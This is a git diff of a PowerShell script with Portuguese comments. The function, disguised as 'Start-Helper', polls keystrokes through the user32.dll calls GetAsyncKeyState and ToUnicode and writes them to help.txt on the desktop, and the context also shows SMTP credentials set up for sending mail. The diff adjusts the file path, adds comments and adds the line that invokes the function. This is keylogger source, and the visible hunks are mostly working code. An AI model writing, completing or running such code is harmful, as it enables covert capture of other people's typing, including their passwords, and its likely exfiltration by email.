@@ -27,7 +27,7 @@ $SMTPPort = "587"
 $credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 
 # Requer PowerShell versão 2
-function Start-Helper($Path="$env:UserProfile\Desktop\help.txt") {
+function Start-Helper($Path=[System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'help.txt')) {
     $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
@@ -41,6 +41,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
     $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
+    # Cria o arquivo na área de trabalho
     $null = New-Item -Path $Path -ItemType File -Force
 
     try {
@@ -80,4 +81,5 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     }
 }
 
+# Inicia a função
 Start-Helper
